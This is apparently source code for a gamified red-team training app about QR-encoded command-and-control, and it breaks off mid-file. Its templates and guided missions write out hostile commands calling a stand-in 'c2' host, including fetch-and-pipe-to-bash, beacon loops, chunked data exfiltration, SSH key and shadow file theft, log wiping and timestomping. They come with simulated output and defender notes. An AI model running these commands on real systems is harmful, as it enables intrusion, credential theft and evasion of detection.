import { useState } from 'react';
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { Textarea } from "@/components/ui/textarea";
import { Input } from "@/components/ui/input";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { useGame } from '@/hooks/useGameSession';
import { Download, Copy, Upload, QrCode, RefreshCw, Zap, Bot, Play, Key, CheckCircle, AlertCircle, Terminal, Radio, Send, Check, Trophy, ChevronLeft, Loader2 } from 'lucide-react';

// C2 Attack Flow Templates - Inspired by MITRE ATT&CK phases
// Organized by attack lifecycle with detailed explanations
interface AttackFlow {
  id: string;
  name: string;
  phase: 'recon' | 'access' | 'persist' | 'exfil';
  icon: string;
  commands: { cmd: string; desc: string }[];
  description: string;
}

const ATTACK_FLOW_TEMPLATES: AttackFlow[] = [
  {
    id: 'recon_flow',
    name: 'Reconnaissance Flow',
    phase: 'recon',
    icon: '🔍',
    description: 'MITRE T1592-T1596: Gather target information before attack',
    commands: [
      { cmd: 'whoami && id', desc: '# Step 1: Who are we? Check current user context' },
      { cmd: 'uname -a && hostname', desc: '# Step 2: System fingerprint - OS, kernel, hostname' },
      { cmd: 'ip addr && cat /etc/hosts', desc: '# Step 3: Network position - IPs and DNS mapping' },
      { cmd: 'ps aux | head -20', desc: '# Step 4: Process recon - what\'s running?' },
    ]
  },
  {
    id: 'access_flow',
    name: 'Initial Access Flow',
    phase: 'access',
    icon: '🚪',
    description: 'MITRE T1078-T1190: Establish foothold on target system',
    commands: [
      { cmd: 'env | grep -iE "key|token|pass|secret"', desc: '# Step 1: Credential harvest - exposed secrets in env' },
      { cmd: 'find /home -name "*.txt" -o -name "*.cfg" 2>/dev/null | head -10', desc: '# Step 2: Config discovery - find sensitive files' },
      { cmd: 'cat ~/.ssh/id_rsa 2>/dev/null || echo "No SSH key"', desc: '# Step 3: SSH key theft - lateral movement prep' },
      { cmd: 'history 2>/dev/null | grep -iE "pass|key|ssh" | head -10', desc: '# Step 4: History mining - past commands reveal secrets' },
    ]
  },
  {
    id: 'persist_flow',
    name: 'Persistence Flow',
    phase: 'persist',
    icon: '🔒',
    description: 'MITRE T1053-T1547: Maintain access across reboots',
    commands: [
      { cmd: 'crontab -l 2>/dev/null', desc: '# Step 1: Check existing cron - avoid detection conflicts' },
      { cmd: 'echo "* * * * * curl -s http://c2/beacon" >> /tmp/.job', desc: '# Step 2: Write beacon task - 1-min callback interval' },
      { cmd: 'echo "export PATH=$PATH:/tmp/.bin" >> ~/.bashrc', desc: '# Step 3: PATH hijack - run malicious binaries' },
      { cmd: 'touch -r /bin/ls /tmp/.job', desc: '# Step 4: Timestomp - match file dates to avoid detection' },
    ]
  },
  {
    id: 'exfil_flow',
    name: 'Exfiltration Flow',
    phase: 'exfil',
    icon: '📤',
    description: 'MITRE T1048: Extract valuable data while evading detection',
    commands: [
      { cmd: 'tar czf /tmp/.data.tar.gz /home/*/Documents 2>/dev/null', desc: '# Step 1: Archive target data - compress for exfil' },
      { cmd: 'base64 /tmp/.data.tar.gz > /tmp/.data.b64', desc: '# Step 2: Base64 encode - evade content inspection' },
      { cmd: 'split -b 1000 /tmp/.data.b64 /tmp/.chunk_', desc: '# Step 3: Chunk data - avoid large transfer detection' },
      { cmd: 'curl -X POST -d @/tmp/.chunk_aa http://c2/collect', desc: '# Step 4: Exfil via HTTPS POST - blend with normal traffic' },
    ]
  },
  {
    id: 'beacon_flow',
    name: 'Beacon Setup Flow',
    phase: 'persist',
    icon: '📡',
    description: 'MITRE T1571: Establish periodic C2 callback beacon',
    commands: [
      { cmd: 'curl -s http://c2/register -d "id=$(hostname)"', desc: '# Step 1: Initial check-in - register with C2 server' },
      { cmd: 'while true; do curl -s http://c2/beacon; sleep 60; done &', desc: '# Step 2: Start beacon loop - check in every 60 seconds' },
      { cmd: 'curl -s http://c2/tasks | bash', desc: '# Step 3: Fetch & execute - download and run tasking' },
      { cmd: 'curl -s http://c2/report -d "$(hostname):$(date):alive"', desc: '# Step 4: Status report - confirm implant is active' },
    ]
  },
  {
    id: 'lateral_flow',
    name: 'Lateral Movement Flow',
    phase: 'access',
    icon: '🕸️',
    description: 'MITRE T1021: Move sideways through the network to higher-value targets',
    commands: [
      { cmd: 'arp -a && cat /etc/hosts', desc: '# Step 1: Map neighbors - find adjacent machines' },
      { cmd: 'for h in $(arp -a | cut -d" " -f2 | tr -d "()"); do ping -c1 -W1 $h; done', desc: '# Step 2: Sweep alive hosts - fast ping scan' },
      { cmd: 'ssh -o StrictHostKeyChecking=no admin@10.0.2.10 "whoami"', desc: '# Step 3: SSH pivot - try stolen creds on neighbor' },
      { cmd: 'scp /tmp/.implant admin@10.0.2.10:/tmp/', desc: '# Step 4: Deploy implant - spread to new host' },
    ]
  },
  {
    id: 'evasion_flow',
    name: 'Defense Evasion Flow',
    phase: 'persist',
    icon: '🥷',
    description: 'MITRE T1070: Evade detection and cover tracks',
    commands: [
      { cmd: 'unset HISTFILE && export HISTSIZE=0', desc: '# Step 1: Kill history - stop recording commands' },
      { cmd: 'echo "" > /var/log/auth.log 2>/dev/null', desc: '# Step 2: Clear auth logs - remove login evidence' },
      { cmd: 'touch -r /bin/ls /tmp/.implant', desc: '# Step 3: Timestomp - make implant look old' },
      { cmd: 'mv /tmp/.implant /usr/lib/.libcrypto.so.1', desc: '# Step 4: Disguise binary - blend into system files' },
    ]
  },
];

const C2_COMMAND_TEMPLATES = [
  { id: 'shell', name: '⚡ Quick: Shell', template: 'whoami', description: 'Simple shell command' },
  { id: 'sysinfo', name: '📊 Quick: System Info', template: 'uname -a && hostname && id', description: 'System fingerprint' },
  { id: 'network', name: '🌐 Quick: Network', template: 'ip addr && netstat -tuln | head -20', description: 'Network config' },
  { id: 'beacon_check', name: '📡 Beacon Check-in', template: 'curl -s http://c2/beacon -d "id=$(hostname)&ts=$(date +%s)"', description: 'C2 beacon heartbeat' },
  { id: 'task_fetch', name: '📥 Fetch Tasks', template: 'curl -s http://c2/tasks/$(hostname) | head -5', description: 'Download queued commands from C2' },
  { id: 'cred_dump', name: '🔑 Credential Dump', template: 'cat /etc/shadow 2>/dev/null || echo "Permission denied"', description: 'Attempt credential harvest' },
  { id: 'proc_inject', name: '💉 Process List', template: 'ps aux --sort=-%mem | head -10', description: 'Find injection targets by memory usage' },
  { id: 'custom', name: '✏️ Custom Command', template: '', description: 'Enter your own' },
];

interface C2GuidedMission {
  id: string;
  name: string;
  icon: string;
  difficulty: 'beginner' | 'intermediate' | 'advanced' | 'expert';
  category: 'beaconing' | 'tasking' | 'evasion' | 'exfiltration' | 'lateral';
  xpReward: number;
  campaignTags: string[];
  description: string;
  briefing: string;
  objectives: string[];
  steps: { instruction: string; command: string; expectedOutput: string; teaching: string }[];
  realWorldCase: string;
  defenderPerspective: string;
}

const C2_GUIDED_MISSIONS: C2GuidedMission[] = [
  {
    id: 'mission_first_beacon',
    name: 'First Beacon',
    icon: '📡',
    difficulty: 'beginner',
    category: 'beaconing',
    xpReward: 50,
    campaignTags: ['c2-fundamentals', 'red-team-basics'],
    description: 'Learn how C2 beacons establish communication with a command server.',
    briefing: 'You\'ve just compromised a web server. Before you can do anything useful, you need to establish a reliable communication channel back to your C2 infrastructure. This is called "beaconing" - the implant periodically calls home to check for new instructions.',
    objectives: [
      'Understand what a beacon is and why attackers use them',
      'Generate a QR-encoded beacon check-in command',
      'Simulate the beacon calling home to the C2 server',
      'Observe the check-in pattern and understand timing',
    ],
    steps: [
      {
        instruction: 'First, identify who you are on the target system. Every good operator starts with situational awareness.',
        command: 'whoami && id',
        expectedOutput: 'www-data\nuid=33(www-data) gid=33(www-data)',
        teaching: 'The "whoami" command reveals your user context. As www-data, you\'re running as the web server process - limited privileges but you\'re inside the network.'
      },
      {
        instruction: 'Now send your first beacon check-in. This tells the C2 server "I\'m alive and ready for commands."',
        command: 'curl -s http://c2/register -d "id=$(hostname)&user=$(whoami)&ts=$(date +%s)"',
        expectedOutput: '{"status":"registered","agent_id":"AGENT-001","interval":60}',
        teaching: 'Real C2 frameworks (Cobalt Strike, Sliver, Mythic) use this same pattern. The beacon registers with the server and receives a callback interval. The "interval" tells the implant how often to check in - 60 seconds here.'
      },
      {
        instruction: 'Start a beacon loop. In real attacks, this runs silently in the background.',
        command: 'while true; do curl -s http://c2/beacon -H "X-Agent: AGENT-001"; sleep 60; done &',
        expectedOutput: '[1] 4521\n{"tasks":[],"next_checkin":60}',
        teaching: 'The "&" runs this in the background. Every 60 seconds, the implant checks in. If the C2 server has tasks queued (commands to run), they\'re returned in the response. An empty task list means "do nothing, check back later."'
      },
      {
        instruction: 'Encode this beacon command as a QR code. This is how QR-based C2 works - commands travel as images.',
        command: 'echo "curl -s http://c2/beacon" | base64',
        expectedOutput: 'Y3VybCAtcyBodHRwOi8vYzIvYmVhY29uCg==',
        teaching: 'By encoding commands in QR codes, the C2 channel looks like normal image downloads to network monitors. The target scans the QR, decodes it, and executes the hidden command. This technique was documented by researchers at DEF CON 2023.'
      },
    ],
    realWorldCase: 'APT29 (Cozy Bear / Russia) used beacon intervals of 12-24 hours to avoid detection during the SolarWinds attack. Their SUNBURST malware waited 2 weeks before first beacon to evade sandboxes.',
    defenderPerspective: 'Look for periodic outbound HTTP/HTTPS connections to the same endpoint. Beacon detection tools like RITA analyze network flow data for regular callback patterns.',
  },
  {
    id: 'mission_receive_commands',
    name: 'Receiving Orders',
    icon: '📥',
    difficulty: 'beginner',
    category: 'tasking',
    xpReward: 75,
    campaignTags: ['c2-fundamentals', 'red-team-basics'],
    description: 'Learn how implants receive and execute commands from the C2 server.',
    briefing: 'Your beacon is active and checking in every 60 seconds. Now the operator (you) needs to queue a command for the implant to execute. This is the "tasking" phase - the C2 server tells the implant what to do next.',
    objectives: [
      'Understand the C2 tasking queue model',
      'Queue a command on the C2 server',
      'Watch the implant fetch and execute the task',
      'Learn about task output collection',
    ],
    steps: [
      {
        instruction: 'Check what tasks are queued for your agent. On a fresh implant, the queue is empty.',
        command: 'curl -s http://c2/tasks/AGENT-001',
        expectedOutput: '{"agent":"AGENT-001","tasks":[],"pending":0}',
        teaching: 'The C2 server maintains a task queue per agent. When the beacon checks in, it downloads pending tasks. This is a "pull" model - the implant reaches out, the server doesn\'t push to the implant (which would reveal the C2 IP).'
      },
      {
        instruction: 'Queue a reconnaissance command. The operator types this on the C2 console, and it waits for the next beacon.',
        command: 'curl -s http://c2/queue -d \'{"agent":"AGENT-001","task":"ps aux | head -20","priority":"normal"}\'',
        expectedOutput: '{"queued":true,"task_id":"T-0042","position":1}',
        teaching: 'Commands don\'t execute immediately - they wait for the next beacon check-in. This delay is intentional: it makes the traffic pattern look like regular polling rather than interactive remote access.'
      },
      {
        instruction: 'Simulate the implant\'s next check-in. It finds the queued task and executes it.',
        command: 'curl -s http://c2/tasks/AGENT-001 | bash',
        expectedOutput: 'USER       PID %CPU    COMMAND\nroot         1  0.0    /sbin/init\nwww-data  1234  2.3    nginx: worker',
        teaching: 'The implant fetches the command text and pipes it to bash for execution. The output is then sent back to the C2 server in the next beacon. Some C2 frameworks encrypt the output before sending it back.'
      },
      {
        instruction: 'Send the output back to C2. This completes the task lifecycle: queue → fetch → execute → report.',
        command: 'curl -s http://c2/report -d \'{"agent":"AGENT-001","task_id":"T-0042","output":"nginx running, mysql running"}\'',
        expectedOutput: '{"received":true,"next_task":null}',
        teaching: 'The full lifecycle is: Operator queues task → Implant beacons → Downloads task → Executes → Reports output → Operator reads output. Each step may be minutes or hours apart depending on beacon interval.'
      },
    ],
    realWorldCase: 'The Lazarus Group (North Korea) used a QR-code-like image steganography system to hide commands inside PNG images posted to legitimate social media. Implants downloaded the image, extracted hidden bytes, and executed them.',
    defenderPerspective: 'Monitor for curl/wget executing piped commands (curl | bash pattern). EDR tools flag this as high-risk behavior. Also watch for processes spawning shell children unexpectedly.',
  },
  {
    id: 'mission_jitter_evasion',
    name: 'Ghost in the Wire',
    icon: '🥷',
    difficulty: 'intermediate',
    category: 'evasion',
    xpReward: 100,
    campaignTags: ['c2-advanced', 'defense-evasion', 'red-team-ops'],
    description: 'Learn how attackers evade beacon detection using jitter, domain fronting, and sleep obfuscation.',
    briefing: 'Your regular 60-second beacon is too predictable. Blue team analysts use tools like RITA and Zeek to detect periodic callbacks. Time to add randomness (jitter) and change your communication pattern to avoid detection.',
    objectives: [
      'Understand why fixed intervals get detected',
      'Implement beacon jitter to randomize check-in times',
      'Learn about sleep obfuscation techniques',
      'Understand domain fronting for C2 hiding',
    ],
    steps: [
      {
        instruction: 'Your current beacon is predictable - exactly 60 seconds between each call. Network analysis instantly spots this pattern.',
        command: 'for i in 1 2 3 4 5; do echo "Beacon at: $(date +%H:%M:%S)"; sleep 60; done',
        expectedOutput: 'Beacon at: 14:00:00\nBeacon at: 14:01:00\nBeacon at: 14:02:00\nBeacon at: 14:03:00\nBeacon at: 14:04:00',
        teaching: 'Fixed-interval beacons create a perfect pattern in network logs. RITA (Real Intelligence Threat Analytics) can detect these in seconds. Any beacon with <5% variance is flagged as suspicious.',
      },
      {
        instruction: 'Add jitter - randomize the sleep time by +/- 30%. Now each check-in happens at a different interval.',
        command: 'INTERVAL=60; JITTER=30; SLEEP=$((INTERVAL + RANDOM % (JITTER*2) - JITTER)); echo "Next beacon in ${SLEEP}s"',
        expectedOutput: 'Next beacon in 47s\nNext beacon in 73s\nNext beacon in 55s\nNext beacon in 68s',
        teaching: 'Jitter adds randomness to the beacon interval. A 30% jitter on a 60-second interval means check-ins happen between 42-78 seconds apart. Cobalt Strike defaults to 10% jitter. Skilled operators use 30-50%.',
      },
      {
        instruction: 'Use DNS for covert beaconing instead of HTTP. DNS queries are almost never blocked and rarely logged in detail.',
        command: 'nslookup $(echo "alive"|base64).beacon.evil.com',
        expectedOutput: 'Server: 8.8.8.8\nAddress: 8.8.8.8#53\n\nNon-authoritative answer:\nYWxpdmUK.beacon.evil.com CNAME task-none.evil.com',
        teaching: 'DNS-based C2 encodes data in subdomain queries. The implant queries "encoded-data.c2domain.com" and the C2 server responds with tasks encoded in DNS records (CNAME, TXT, A records). Tools like dnscat2 and Cobalt Strike support this.',
      },
      {
        instruction: 'Encode this jittered beacon as a QR code for deployment. The QR contains the full evasion-enabled beacon script.',
        command: 'echo \'while true; do S=$((45+RANDOM%30)); curl -s https://cdn.legit-site.com/pixel.gif -H "X-ID: AGENT-001"; sleep $S; done\' | base64',
        expectedOutput: 'd2hpbGUgdHJ1ZTsgZG8gUz0kKCg0NStSQU5ET00lMzApKTsgY3VybCAtcyBod...',
        teaching: 'The beacon now: 1) Uses jitter (45-75s intervals), 2) Disguises as ad pixel requests to cdn.legit-site.com, 3) Hides the agent ID in a custom header. To network monitors, this looks like a webpage loading analytics pixels.',
      },
    ],
    realWorldCase: 'APT41 (China) used beacon jitter of 40-60% and rotated between 5 different C2 domains. They also used domain fronting through Azure CDN - traffic appeared to go to microsoft.com but was routed to their C2 server.',
    defenderPerspective: 'Use statistical analysis on connection intervals. Even with 50% jitter, the mean interval is consistent. RITA detects this. Also monitor DNS query patterns for encoded subdomains (high entropy in subdomain names).',
  },
  {
    id: 'mission_data_exfil',
    name: 'The Great Escape',
    icon: '📤',
    difficulty: 'intermediate',
    category: 'exfiltration',
    xpReward: 125,
    campaignTags: ['c2-advanced', 'data-exfiltration'],
    description: 'Learn how stolen data leaves the network through QR-encoded C2 channels without triggering DLP.',
    briefing: 'You\'ve found the crown jewels - a database of credentials, API keys, and customer records. Now you need to get this data out of the network without triggering Data Loss Prevention (DLP) systems. The QR C2 channel can encode data in image format, which DLP rarely inspects.',
    objectives: [
      'Understand data staging and chunking for exfiltration',
      'Encode sensitive data into QR-transportable format',
      'Learn about DLP evasion through encoding',
      'Practice the exfil lifecycle end-to-end',
    ],
    steps: [
      {
        instruction: 'Stage the target data. Collect everything valuable into a single archive.',
        command: 'tar czf /tmp/.data.tar.gz /home/*/Documents /etc/shadow /var/backups/*.sql 2>/dev/null && ls -lh /tmp/.data.tar.gz',
        expectedOutput: '-rw-r--r-- 1 www-data www-data 2.3M /tmp/.data.tar.gz',
        teaching: 'Staging means collecting scattered files into one archive. Attackers prioritize: database dumps (.sql), config files with creds (.env, .cfg), SSH keys, browser profiles, and email archives.',
      },
      {
        instruction: 'Encode and chunk the data. Large transfers get noticed - split into small pieces that blend with normal traffic.',
        command: 'base64 /tmp/.data.tar.gz | split -b 4096 - /tmp/.chunk_ && ls /tmp/.chunk_* | wc -l',
        expectedOutput: '47',
        teaching: 'The data is base64-encoded (text-safe) then split into 4KB chunks. Each chunk is about the size of a normal web request body. 47 chunks means 47 separate "normal-looking" HTTP requests over the next few hours.',
      },
      {
        instruction: 'Exfiltrate one chunk via the QR C2 channel. Each chunk looks like a regular API call.',
        command: 'curl -s http://c2/collect -H "Content-Type: application/octet-stream" -d @/tmp/.chunk_aa -H "X-Chunk: 1/47"',
        expectedOutput: '{"received":"chunk_aa","size":4096,"remaining":46}',
        teaching: 'Each chunk is sent as a separate HTTP POST. The X-Chunk header tells the C2 server the sequence for reassembly. Timing is crucial - sending all 47 at once would spike traffic. Smart operators space chunks across beacon intervals.',
      },
      {
        instruction: 'Encode the exfil command as a QR for automated delivery. The QR triggers the entire exfil sequence.',
        command: 'echo \'for f in /tmp/.chunk_*; do curl -s http://c2/collect -d @$f; sleep $((30+RANDOM%60)); done\' | base64',
        expectedOutput: 'Zm9yIGYgaW4gL3RtcC8uY2h1bmtfKjsgZG8gY3VybCAtcyBodHRwOi8vYzIv...',
        teaching: 'The QR payload triggers automated exfil with random delays (30-90s between chunks). Total exfil time: ~45 minutes for 2.3MB. Slow but stealthy. Real APTs sometimes exfil over days or weeks.',
      },
    ],
    realWorldCase: 'The Anthem health insurance breach (2015) exfiltrated 78.8 million patient records. APT19 used encrypted RAR archives split into chunks, exfiltrated via HTTPS to look like normal web traffic. Total exfil took 6 weeks.',
    defenderPerspective: 'DLP systems should inspect encoded content (base64, hex). Monitor for unusual outbound data volumes per host. NetFlow analysis can reveal slow-drip exfiltration patterns over time.',
  },
  {
    id: 'mission_pivot_chain',
    name: 'Network Hop',
    icon: '🕸️',
    difficulty: 'advanced',
    category: 'lateral',
    xpReward: 150,
    campaignTags: ['c2-advanced', 'lateral-movement', 'red-team-ops'],
    description: 'Chain multiple compromised hosts together to reach internal systems that can\'t talk to the internet.',
    briefing: 'The web server you compromised (10.0.2.15) can reach the internet for C2, but the database server (10.0.2.10) and domain controller (10.0.2.5) are on isolated network segments. You need to use the web server as a pivot point - relaying commands through it to reach the high-value targets deeper in the network.',
    objectives: [
      'Understand network pivoting and relay concepts',
      'Set up a SOCKS proxy through the compromised host',
      'Relay C2 commands to isolated internal systems',
      'Chain QR-encoded commands through multiple hops',
    ],
    steps: [
      {
        instruction: 'Map the internal network from your foothold. Discover what else is reachable.',
        command: 'ip route && arp -a && for i in $(seq 1 20); do ping -c1 -W1 10.0.2.$i 2>/dev/null && echo "10.0.2.$i ALIVE"; done',
        expectedOutput: 'default via 10.0.2.1 dev eth0\n10.0.2.5 ALIVE\n10.0.2.10 ALIVE\n10.0.2.11 ALIVE\n10.0.2.15 ALIVE',
        teaching: 'Network reconnaissance from inside reveals the topology. You found 4 live hosts including yourself. The domain controller (10.0.2.5) and database (10.0.2.10) are high-value targets that can\'t reach the internet directly.',
      },
      {
        instruction: 'Set up a relay. The web server will forward C2 commands to internal hosts.',
        command: 'ssh -D 1080 -fN localhost && echo "SOCKS proxy on 1080"',
        expectedOutput: 'SOCKS proxy on 1080',
        teaching: 'A SOCKS proxy (-D 1080) tunnels all traffic through the compromised host. Now you can route C2 traffic through this proxy to reach internal systems. Tools like proxychains wrap any command to use the proxy.',
      },
      {
        instruction: 'Send a command to the database server through the pivot.',
        command: 'proxychains curl -s http://10.0.2.10:3306 2>/dev/null || ssh -o StrictHostKeyChecking=no root@10.0.2.10 "whoami && hostname"',
        expectedOutput: 'root\ndb-master',
        teaching: 'The command travels: Your C2 → Internet → Web Server (10.0.2.15) → SSH tunnel → Database Server (10.0.2.10). The database server never contacts the internet. This is why network segmentation alone isn\'t enough - a compromised host in both zones bridges the gap.',
      },
      {
        instruction: 'Encode a pivot-chain QR. This single QR sets up the full relay infrastructure.',
        command: 'echo \'ssh -D 1080 -fN localhost && proxychains curl -s http://c2/beacon -d "pivot=10.0.2.10"\' | base64',
        expectedOutput: 'c3NoIC1EIDEwODAgLWZOIGxvY2FsaG9zdCAmJiBwcm94eWNoYWlucyBjdXJsIC...',
        teaching: 'One QR code sets up the entire pivot chain. When deployed, it creates a SOCKS proxy and immediately beacons through it, registering the new network path with C2. The operator now has visibility into the isolated segment.',
      },
    ],
    realWorldCase: 'During the 2020 SolarWinds attack, APT29 used the compromised Orion servers as pivot points to access internal Microsoft and government networks. They chained 4-5 hops deep, making attribution nearly impossible.',
    defenderPerspective: 'Monitor for SSH tunnels (dynamic port forwarding). Watch for processes using proxychains or socat. Internal network traffic from DMZ hosts to sensitive segments should trigger alerts.',
  },
  {
    id: 'mission_beacon_sleep',
    name: 'Playing Dead',
    icon: '💀',
    difficulty: 'advanced',
    category: 'evasion',
    xpReward: 175,
    campaignTags: ['c2-advanced', 'defense-evasion', 'apt-tradecraft'],
    description: 'Learn sleep obfuscation - how implants hide in memory while waiting between beacons.',
    briefing: 'Your beacon checks in every 60 seconds, but what does it do during those 60 seconds of waiting? It sits in memory with its malicious code exposed. Modern EDR tools scan process memory for known signatures. Sleep obfuscation encrypts the implant\'s memory while it waits, making it invisible to memory scanners.',
    objectives: [
      'Understand why idle implants get caught',
      'Learn how sleep obfuscation works',
      'Practice encrypting beacon memory during sleep',
      'Understand timer-based and callback-based sleep',
    ],
    steps: [
      {
        instruction: 'Simulate a basic beacon that\'s vulnerable to memory scanning during its sleep period.',
        command: 'echo "MALICIOUS_SHELLCODE_MARKER_0xDEADBEEF" > /tmp/.implant && sleep 60 && cat /tmp/.implant',
        expectedOutput: 'MALICIOUS_SHELLCODE_MARKER_0xDEADBEEF',
        teaching: 'During the 60-second sleep, the shellcode marker sits in memory in plaintext. An EDR memory scan at any point during this window will find it. The implant is essentially "sleeping with its eyes open" - fully visible.',
      },
      {
        instruction: 'Now encrypt the implant\'s payload before sleeping. Decrypt only when it\'s time to beacon.',
        command: 'PAYLOAD="curl -s http://c2/beacon"; ENC=$(echo $PAYLOAD | openssl enc -aes-256-cbc -a -pass pass:$(hostname) 2>/dev/null); echo "Encrypted during sleep: $ENC"',
        expectedOutput: 'Encrypted during sleep: U2FsdGVkX1+abc123def456...',
        teaching: 'Sleep obfuscation encrypts the implant\'s code/strings in memory before the sleep call. During the sleep window (95%+ of the time), memory scanners see only encrypted gibberish. Right before beacon, it decrypts, executes, then re-encrypts.',
      },
      {
        instruction: 'Implement a timer-based wakeup that decrypts, beacons, then re-encrypts.',
        command: 'echo "1. Decrypt payload\\n2. Execute beacon\\n3. Collect output\\n4. Encrypt payload\\n5. Sleep with obfuscation\\n--- Total exposure: ~200ms out of 60000ms ---"',
        expectedOutput: '1. Decrypt payload\n2. Execute beacon\n3. Collect output\n4. Encrypt payload\n5. Sleep with obfuscation\n--- Total exposure: ~200ms out of 60000ms ---',
        teaching: 'The implant is only "exposed" (decrypted in memory) for ~200ms during each 60-second cycle. That\'s 0.3% of the time. Memory scanners would need to catch this exact window. Cobalt Strike\'s sleep_mask and Sliver\'s obfuscation use this technique.',
      },
      {
        instruction: 'Encode the sleep-obfuscated beacon cycle as a QR payload for deployment.',
        command: 'echo \'KEY=$(hostname); while true; do P=$(echo $ENC|openssl enc -d -aes-256-cbc -a -pass pass:$KEY); eval $P; ENC=$(echo $P|openssl enc -aes-256-cbc -a -pass pass:$KEY); sleep $((45+RANDOM%30)); done\' | base64',
        expectedOutput: 'S0VZPSQoaG9zdG5hbWUpOyB3aGlsZSB0cnVlOyBkbyBQPSQoZWNobyAkRU5D...',
        teaching: 'This QR deploys a fully sleep-obfuscated beacon. The payload decrypts only for execution, then re-encrypts itself. Combined with jitter (45-75s), this is very difficult to detect with traditional tools.',
      },
    ],
    realWorldCase: 'Cobalt Strike introduced "sleep_mask" in version 4.1, which XORs beacon memory during sleep. This single feature caused many EDR products to miss Cobalt Strike implants. It took vendors 6+ months to develop countermeasures.',
    defenderPerspective: 'Use ETW (Event Tracing for Windows) to monitor for VirtualProtect calls that change memory permissions (RW→RX→RW cycles). Also, periodic memory scanning at random intervals can catch the brief decryption window.',
  },
];

// Target machine profiles for realistic simulation
interface TargetMachine {
  id: string;
  name: string;
  os: string;
  icon: string;
  description: string;
  responses: Record<string, string>;
}

const TARGET_MACHINES: TargetMachine[] = [
  {
    id: 'linux_server',
    name: 'Linux Server',
    os: 'Ubuntu 22.04 LTS',
    icon: '🐧',
    description: 'Production web server - high value target',
    responses: {
      'whoami': 'www-data',
      'whoami && id': 'www-data\nuid=33(www-data) gid=33(www-data) groups=33(www-data)',
      'uname -a && hostname': 'Linux prod-web-01 5.15.0-89-generic #99-Ubuntu SMP x86_64 GNU/Linux\nprod-web-01',
      'uname -a && hostname && id': 'Linux prod-web-01 5.15.0-89-generic #99-Ubuntu SMP x86_64 GNU/Linux\nprod-web-01\nuid=33(www-data) gid=33(www-data) groups=33(www-data)',
      'ip addr && cat /etc/hosts': 'eth0: 10.0.2.15/24 brd 10.0.2.255\nlo: 127.0.0.1/8\n\n127.0.0.1 localhost\n10.0.2.10 db-master.internal\n10.0.2.11 redis-01.internal',
      'ps aux | head -20': 'USER       PID %CPU %MEM    COMMAND\nroot         1  0.0  0.1    /sbin/init\nwww-data  1234  2.3  4.5    nginx: worker process\nwww-data  1235  1.8  3.2    php-fpm: pool www\nmysql     2001  5.2 12.3    /usr/sbin/mysqld\nredis     2050  0.5  1.1    redis-server *:6379',
      'env | grep -iE "key|token|pass|secret"': 'DB_PASSWORD=pr0d_s3cr3t_2024\nAPI_KEY=sk-live-xxxxxxxxxxxx\nAWS_SECRET_ACCESS_KEY=AKIA...[REDACTED]',
      'cat ~/.ssh/id_rsa 2>/dev/null || echo "No SSH key"': '-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAA...\n[TRUNCATED - 47 lines]\n-----END OPENSSH PRIVATE KEY-----',
      'crontab -l 2>/dev/null': '# Production cron jobs\n0 2 * * * /opt/backup/daily_backup.sh\n*/5 * * * * /opt/monitoring/health_check.sh\n0 0 * * 0 /opt/maintenance/log_rotate.sh',
    }
  },
  {
    id: 'windows_workstation',
    name: 'Windows Workstation',
    os: 'Windows 11 Pro',
    icon: '🪟',
    description: 'Finance department workstation',
    responses: {
      'whoami': 'CORP\\jsmith',
      'whoami && id': 'CORP\\jsmith\nUser SID: S-1-5-21-3623811015-3361044348-30300820-1013',
      'uname -a && hostname': 'DESKTOP-FIN042\nMicrosoft Windows 11 Pro 10.0.22631',
      'ip addr && cat /etc/hosts': 'Ethernet adapter Ethernet:\n   IPv4 Address: 192.168.1.142\n   Subnet Mask: 255.255.255.0\n   Default Gateway: 192.168.1.1\n\n# hosts file:\n192.168.1.10 dc01.corp.local\n192.168.1.20 fileserver.corp.local',
      'ps aux | head -20': 'Name                     CPU   Memory\n----                     ---   ------\nOutlook                  3.2%   450MB\nExcel                    2.1%   380MB\nTeams                    5.4%   890MB\nOneDrive                 0.8%   120MB\nCrowdStrike Falcon       1.2%   95MB',
      'env | grep -iE "key|token|pass|secret"': 'AZURE_CLIENT_SECRET=app-secret-xxxxx\nSLACK_TOKEN=xoxb-xxxxx-xxxxx\nDB_CONNECTION_STRING=Server=sql01;User Id=sa;Password=Corp2024!',
      'cat ~/.ssh/id_rsa 2>/dev/null || echo "No SSH key"': 'No SSH key found\n\nBUT FOUND: C:\\Users\\jsmith\\.aws\\credentials\n[default]\naws_access_key_id = AKIAIOSFODNN7EXAMPLE\naws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY',
    }
  },
  {
    id: 'iot_camera',
    name: 'IoT Camera',
    os: 'BusyBox Linux',
    icon: '📷',
    description: 'Security camera - often misconfigured',
    responses: {
      'whoami': 'root',
      'whoami && id': 'root\nuid=0(root) gid=0(root)',
      'uname -a && hostname': 'Linux cam-lobby-01 3.10.14 armv7l GNU/Linux\ncam-lobby-01',
      'ip addr && cat /etc/hosts': 'eth0: 192.168.50.101/24\n\n127.0.0.1 localhost',
      'ps aux | head -20': 'PID   USER     COMMAND\n  1   root     /bin/busybox init\n 42   root     /usr/bin/rtspd -p 554\n 43   root     /usr/bin/telnetd\n 44   root     /opt/dvr/recorder',
      'env | grep -iE "key|token|pass|secret"': 'ADMIN_PASSWORD=admin123\nRTSP_AUTH=admin:admin\nFTP_PASSWORD=camera',
      'cat ~/.ssh/id_rsa 2>/dev/null || echo "No SSH key"': 'No SSH key\n\nDEFAULT CREDS FOUND:\nWeb: admin/admin\nTelnet: root/xc3511\nRTSP: admin/12345',
    }
  },
  {
    id: 'docker_container',
    name: 'Docker Container',
    os: 'Alpine Linux',
    icon: '🐳',
    description: 'Containerized microservice',
    responses: {
      'whoami': 'node',
      'whoami && id': 'node\nuid=1000(node) gid=1000(node) groups=1000(node)',
      'uname -a && hostname': 'Linux api-payments-7f4d8c9b6d-xk2pq 5.15.0 x86_64 Linux\napi-payments-7f4d8c9b6d-xk2pq',
      'ip addr && cat /etc/hosts': 'eth0: 10.244.1.156/24\n\n10.244.1.1 kubernetes.default\n10.244.1.50 redis-master\n10.244.1.51 postgres-primary',
      'ps aux | head -20': 'PID   USER     COMMAND\n  1   node     node /app/server.js\n 15   node     /app/node_modules/.bin/prisma',
